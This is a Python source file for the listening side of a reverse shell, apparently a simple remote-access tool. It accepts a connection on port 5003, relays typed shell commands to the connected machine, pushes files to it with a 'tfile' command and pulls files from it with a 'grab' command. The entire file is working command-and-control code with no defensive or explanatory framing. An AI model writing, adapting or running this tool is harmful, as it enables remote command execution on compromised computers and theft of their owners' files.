import socket
import os

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 256
SEPARATOR = "<sep>"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen()
    client_socket, client_address = s.accept()
    cwd = client_socket.recv(BUFFER_SIZE).decode()

    while True:
        command = input(f'{cwd} $>')
        if command == 'QUIT':
            s.close()
            break
        elif command.startswith('tfile'):
            file_path = command.split()[1]
            file_name = os.path.basename(file_path)
            client_socket.sendall(command.encode())
            with open(file_path, 'rb') as file:
                file_data = file.read(BUFFER_SIZE)
                while file_data:
                    client_socket.sendall(file_data)
                    file_data = file.read(BUFFER_SIZE)
            client_socket.sendall(SEPARATOR.encode())
            client_socket.sendall(file_name.encode())
        elif command.startswith('grab'):
            client_socket.sendall(command.encode())
            file_name = command.split()[1]
            client_socket.sendall(file_name.encode())
            obtained_data = b''
            while True:
                data = client_socket.recv(BUFFER_SIZE)
                if not data or data == SEPARATOR.encode():
                    break
                obtained_data += data
            file_name = client_socket.recv(BUFFER_SIZE).decode()
            with open(file_name, 'wb') as file:
                file.write(obtained_data)
        else:
            client_socket.sendall(command.encode())
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
    s.close()
